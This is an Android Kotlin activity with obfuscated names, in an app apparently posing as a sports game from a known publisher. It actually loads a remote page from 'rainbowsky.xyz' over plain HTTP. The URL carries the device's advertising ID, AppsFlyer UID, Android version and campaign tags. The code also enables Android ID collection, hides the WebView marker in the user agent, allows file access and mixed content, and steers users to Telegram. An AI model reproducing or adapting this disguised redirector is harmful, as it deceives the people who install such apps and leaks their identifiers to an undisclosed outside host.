package com.playgendary.sportmasterst.bhud

import java.io.IOException
import com.playgendary.sportmasterst.R
import android.app.Activity
import com.onesignal.OneSignal
import android.content.Intent
import android.content.pm.PackageManager
import com.appsflyer.AppsFlyerLib
import android.net.Uri
import com.playgendary.sportmasterst.bhud.Hysdya.Companion.ZOSLDSDOK
import android.os.*
import android.provider.MediaStore
import android.util.Log
import android.webkit.*
import com.playgendary.sportmasterst.bhud.Hysdya.Companion.MNSHJDHJS
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

import com.google.android.material.snackbar.Snackbar

import com.orhanobut.hawk.Hawk


import org.json.JSONException
import org.json.JSONObject
import com.playgendary.sportmasterst.bhud.Hysdya.Companion.WOSIAKDJDSA
import com.playgendary.sportmasterst.databinding.ActivityXfdsBinding
import java.io.File


class Bcfdgha : AppCompatActivity() {
    lateinit var njijdskosdao: ActivityXfdsBinding
    lateinit var wosadlsdlpasd: WebView
    private val NJIDSOOKSAD = 1
    var eoaspsladsaapsd: String? = null
    var jisdodskdsaj: ValueCallback<Array<Uri>>? = null


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        njijdskosdao = ActivityXfdsBinding.inflate(layoutInflater)
        setContentView(njijdskosdao.root)
        wosadlsdlpasd = njijdskosdao.ksijsdas
        Snackbar.make(
            njijdskosdao.root, "Loading...",
            Snackbar.LENGTH_LONG
        ).show()

        val bkjjsdiasdhusd = CookieManager.getInstance()
        bkjjsdiasdhusd.setAcceptCookie(true)
        bkjjsdiasdhusd.setAcceptThirdPartyCookies(wosadlsdlpasd, true)
        qopsadlsadlpasdl()
        val activity: Activity = this

        wosadlsdlpasd.webViewClient = object : WebViewClient() {


            override fun shouldOverrideUrlLoading(view: WebView, jjjsdiasd: String): Boolean {
                try {
                    if (URLUtil.isNetworkUrl(jjjsdiasd)) {
                        return false
                    }
                    if (vgasghdhasdbnasdjasdjasdnsd(jjjsdiasd)) {

                        val wpsodldskaksdl = Intent(Intent.ACTION_VIEW)
                        wpsodldskaksdl.data = Uri.parse(jjjsdiasd)
                        startActivity(wpsodldskaksdl)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                view.loadUrl(jjjsdiasd)
            }


            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                xbcbcbxhhsdahuasd(url)
            }

            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(activity, description, Toast.LENGTH_SHORT).show()
            }


        }
        wosadlsdlpasd.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                jisdodskdsaj?.onReceiveValue(null)
                jisdodskdsaj = filePathCallback
                var jnsdabhbsdh: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (jnsdabhbsdh!!.resolveActivity(packageManager) != null) {

                    var wpsodlsdkksadk: File? = null
                    try {
                        wpsodlsdkksadk = guhjsdajijsd()
                        jnsdabhbsdh.putExtra("PhotoPath", eoaspsladsaapsd)
                    } catch (ex: IOException) {

                    }

                    if (wpsodlsdkksadk != null) {
                        eoaspsladsaapsd = "file:" + wpsodlsdkksadk.absolutePath
                        jnsdabhbsdh.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(wpsodlsdkksadk)
                        )
                    } else {
                        jnsdabhbsdh = null
                    }
                }
                val vhudsahdasuhasd = Intent(Intent.ACTION_GET_CONTENT)
                vhudsahdasuhasd.addCategory(Intent.CATEGORY_OPENABLE)
                vhudsahdasuhasd.type = "image/*"
                val wpsodlasdkkalsd: Array<Intent?> =
                    jnsdabhbsdh?.let { arrayOf(it) } ?: arrayOfNulls(0)
                val vhhsdujsadjisadji = Intent(Intent.ACTION_CHOOSER)
                vhhsdujsadjisadji.putExtra(Intent.EXTRA_INTENT, vhudsahdasuhasd)
                vhhsdujsadjisadji.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_chooser))
                vhhsdujsadjisadji.putExtra(Intent.EXTRA_INITIAL_INTENTS, wpsodlasdkkalsd)
                startActivityForResult(
                    vhhsdujsadjisadji, NJIDSOOKSAD
                )
                return true
            }


            @Throws(IOException::class)
            private fun guhjsdajijsd(): File {
                var posdlkdslsd = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "DirectoryNameHere"
                )
                if (!posdlkdslsd.exists()) {
                    posdlkdslsd.mkdirs()
                }


                posdlkdslsd =
                    File(posdlkdslsd.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
                return posdlkdslsd
            }

        }

        wosadlsdlpasd.loadUrl(vjhdsusdajjisd())
    }

    private fun vgasghdhasdbnasdjasdjasdnsd(uri: String): Boolean {

        val xchsdjsdns = packageManager
        try {

            xchsdjsdns.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)


            return true
        } catch (e: PackageManager.NameNotFoundException) {

        }
        return false
    }

    private fun vjhdsusdajjisd(): String {

        val ldsopsdllpsda = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)

        val gfbbsdhbdsasd:String? = Hawk.get(MNSHJDHJS)
        val aospdlasdlppdls: String? = Hawk.get(ZOSLDSDOK)
        val bhsahdasdjasdjud: String? = Hawk.get(WOSIAKDJDSA)

        val xdloskkoasd = "http://"
        val cchbsbhsd = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        val vjshadhhsdhsdhahjasd = "com.playgendary.sportmasterst"
        val njdaksmmkasd = "rainbowsky.xyz/go.php?to=2&"
        val njhasdhjhasdas = "sub_id_4="
        val wpsodlasdldsallasdk = "sub_id_1="
        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val zpsolsdkasdklsa = "sub_id_6="
        val bjnjsdksdak = "deeporg"
        val eoasdplasdlsa = "sub_id_5="
        val qoskdlasdklaksd = Build.VERSION.RELEASE
        val pasodlsdakkasd = "ad_id="

        val mnnjjasdbnasd = "naming"
        val wpsdolsdla = "deviceID="



        val loasldsaplmkdska = xdloskkoasd + njdaksmmkasd

        var njsakasdosadko = ""
        if (gfbbsdhbdsasd != "null") {
            njsakasdosadko =
                "$loasldsaplmkdska$wpsodlasdldsallasdk$gfbbsdhbdsasd&$wpsdolsdla$cchbsbhsd&$pasodlsdakkasd$bhsahdasdjasdjud&$njhasdhjhasdas$vjshadhhsdhsdhahjasd&$eoasdplasdlsa$qoskdlasdklaksd&$zpsolsdkasdklsa$mnnjjasdbnasd"
        } else {
            njsakasdosadko =
                "$loasldsaplmkdska$wpsodlasdldsallasdk$aospdlasdlppdls&$wpsdolsdla$cchbsbhsd&$pasodlsdakkasd$bhsahdasdjasdjud&$njhasdhjhasdas$vjshadhhsdhsdhahjasd&$eoasdplasdlsa$qoskdlasdklaksd&$zpsolsdkasdklsa$bjnjsdksdak"
        }
        Log.d("TESTAG", "Test Result $njsakasdosadko")
        duuasdhjiasd(cchbsbhsd.toString())
        return ldsopsdllpsda.getString("SAVED_URL", njsakasdosadko).toString()
    }
    private fun qopsadlsadlpasdl() {
        val bhjdsfjndfko = wosadlsdlpasd.settings
        bhjdsfjndfko.javaScriptCanOpenWindowsAutomatically = true
        bhjdsfjndfko.pluginState = WebSettings.PluginState.ON
        bhjdsfjndfko.builtInZoomControls = true
        bhjdsfjndfko.loadWithOverviewMode = true
        bhjdsfjndfko.allowFileAccess = true
        bhjdsfjndfko.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        bhjdsfjndfko.javaScriptEnabled = true
        bhjdsfjndfko.setSupportZoom(true)
        bhjdsfjndfko.domStorageEnabled = true
        bhjdsfjndfko.displayZoomControls = false
        bhjdsfjndfko.setSupportMultipleWindows(false)
        bhjdsfjndfko.useWideViewPort = true
        bhjdsfjndfko.setAppCacheEnabled(true)
        bhjdsfjndfko.allowContentAccess = true
        bhjdsfjndfko.userAgentString = bhjdsfjndfko.userAgentString.replace("; wv", "")




    }

    private var njskamdsa = false
    override fun onBackPressed() {


        if (wosadlsdlpasd.canGoBack()) {
            if (njskamdsa) {
                wosadlsdlpasd.stopLoading()
                wosadlsdlpasd.loadUrl(qposalldkkasd)
            }
            this.njskamdsa = true
            wosadlsdlpasd.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                njskamdsa = false
            }, 2000)

        } else {
            super.onBackPressed()
        }
    }






    private fun duuasdhjiasd(string: String) {
        OneSignal.setExternalUserId(
            string,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(nmasksdjijiasd: JSONObject) {
                    try {
                        if (nmasksdjijiasd.has("push") && nmasksdjijiasd.getJSONObject("push").has("success")) {
                            val clsaodoksda = nmasksdjijiasd.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $clsaodoksda"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (nmasksdjijiasd.has("email") && nmasksdjijiasd.getJSONObject("email").has("success")) {
                            val bjasdkasdikoasd =
                                nmasksdjijiasd.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $bjasdkasdikoasd"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (nmasksdjijiasd.has("sms") && nmasksdjijiasd.getJSONObject("sms").has("success")) {
                            val cksanisjadijasd = nmasksdjijiasd.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $cksanisjadijasd"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }


    override fun onActivityResult(ksdllsadlsda: Int, wosapaspdsd: Int, vhsdjsdiaasjid: Intent?) {
        if (ksdllsadlsda != NJIDSOOKSAD || jisdodskdsaj == null) {
            super.onActivityResult(ksdllsadlsda, wosapaspdsd, vhsdjsdiaasjid)
            return
        }
        var clsadopasdlasd: Array<Uri>? = null

        if (wosapaspdsd == AppCompatActivity.RESULT_OK) {
            if (vhsdjsdiaasjid == null || vhsdjsdiaasjid.data == null) {
                clsadopasdlasd = arrayOf(Uri.parse(eoaspsladsaapsd))
            } else {
                val loasdkasdokasd = vhsdjsdiaasjid.dataString
                if (loasdkasdokasd != null) {
                    clsadopasdlasd = arrayOf(Uri.parse(loasdkasdokasd))
                }
            }
        }
        jisdodskdsaj?.onReceiveValue(clsadopasdlasd)
        jisdodskdsaj = null
    }



    var qposalldkkasd = ""
    fun xbcbcbxhhsdahuasd(url: String?) {
        if (!url!!.contains("t.me")) {

            if (qposalldkkasd == "") {
                qposalldkkasd = getSharedPreferences(
                    "SP_WEBVIEW_PREFS",
                    AppCompatActivity.MODE_PRIVATE
                ).getString(
                    "SAVED_URL",
                    url
                ).toString()

                val zpasodkasdo = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
                val njjisdkaosdksao = zpasodkasdo.edit()
                njjisdkaosdksao.putString("SAVED_URL", url)
                njjisdkaosdksao.apply()
            }
        }
    }



}